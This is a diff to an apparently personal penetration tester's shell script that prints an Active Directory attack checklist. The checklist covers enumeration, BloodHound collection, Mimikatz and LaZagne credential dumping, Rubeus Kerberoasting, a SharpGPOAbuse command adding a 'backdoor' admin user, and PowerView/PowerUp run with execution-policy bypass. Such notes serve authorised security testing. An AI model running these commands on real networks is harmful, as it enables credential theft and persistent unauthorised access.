@@ -1,32 +1,83 @@
-========================================
-Active Directory Enumeration Methodology
-========================================
-
-=== NO CREDENTIALS ===
-
-# Run your custom enumeration scripts
-noauth_smb
-noauth_ldap
-noauth_kerberos
-noauth_dns
-
-========================================
-
-=== WITH CREDENTIALS ===
-
-# Run your custom enumeration scripts
-auth_smb
-auth_ldap
-auth_kerberos
-
-========================================
-
-=== BLOODHOUND DATA COLLECTION ===
-
-# SharpHound (Windows)
-.\SharpHound.exe -c All -d domain.local --zipfilename output.zip
-.\SharpHound.exe -c DCOnly
-
-# RustHound (Linux)
-/usr/local/bin/mycommands/methodology: line 50: syntax error near unexpected token `('
-/usr/local/bin/mycommands/methodology: line 50: `echo "# Snaffler (File/Share Hunting)"'
+#!/bin/bash
+echo '========================================'
+echo 'Active Directory Enumeration Methodology'
+echo '========================================'
+echo ''
+echo '=== NO CREDENTIALS ==='
+echo 'ad_vuln_check'
+echo '# Run your custom enumeration scripts'
+echo 'noauth_smb'
+echo 'noauth_ldap'
+echo 'noauth_kerberos'
+echo 'noauth_dns'
+echo 'check nxc new stuff'
+echo '========================================'
+echo ''
+echo '=== WITH CREDENTIALS ==='
+echo ''
+echo '# Run your custom enumeration scripts'
+echo 'auth_smb'
+echo 'auth_ldap'
+echo 'auth_kerberos'
+echo 'nmap udp'
+echo 'certipy find'
+echo 'responder if needed'
+echo 'check nxc new stuff'
+echo '========================================'
+echo ''
+echo '=== BLOODHOUND DATA COLLECTION ==='
+echo ''
+echo '# SharpHound (Windows)'
+echo '.\SharpHound.exe -c All -d domain.local --zipfilename output.zip'
+echo '.\SharpHound.exe -c DCOnly'
+echo ''
+echo '# RustHound (Linux)'
+echo '/opt/RustHound-CE/rusthound-ce -d $domain -u $user@$domain -p $pass -z'
+echo ''
+echo '========================================'
+echo ''
+echo '=== POST-EXPLOITATION TOOLS ==='
+echo ''
+echo '# Mimikatz'
+echo 'mimikatz.exe'
+echo '  sekurlsa::logonpasswords'
+echo '  lsadump::sam'
+echo '  lsadump::secrets'
+echo '  sekurlsa::tickets'
+echo ''
+echo '# Snaffler (File/Share Hunting)'
+echo 'Snaffler.exe -s -o snaffler.log'
+echo ''
+echo '# LaZagne (Password Recovery)'
+echo 'laZagne.exe all'
+echo ''
+echo '# Rubeus (Kerberos Abuse)'
+echo 'Rubeus.exe kerberoast'
+echo 'Rubeus.exe asreproast'
+echo 'Rubeus.exe dump'
+echo ''
+echo '# SharpGPOAbuse'
+echo '.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Evil" --Author admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add"'
+echo ''
+echo '# PowerView (ACL Enumeration)'
+echo 'powershell -ep bypass'
+echo 'Import-Module .\PowerView.ps1'
+echo 'Get-DomainUser'
+echo 'Get-DomainGroup'
+echo 'Get-DomainComputer'
+echo 'Find-InterestingDomainAcl'
+echo 'Get-DomainGPO'
+echo ''
+echo '# WinPEAS'
+echo '.\winPEASx64.exe'
+echo ''
+echo '# PowerUp (Privilege Escalation)'
+echo 'powershell -ep bypass'
+echo 'Import-Module .\PowerUp.ps1'
+echo 'Invoke-AllChecks'
+echo ''
+echo 'if windows server 2025 BadSuccessor'
+echo '========================================'
+echo ''
+echo '(hint) Start with no-auth enumeration, then escalate with credentials'
+echo '(hint) Always run BloodHound for visualization and attack path analysis'
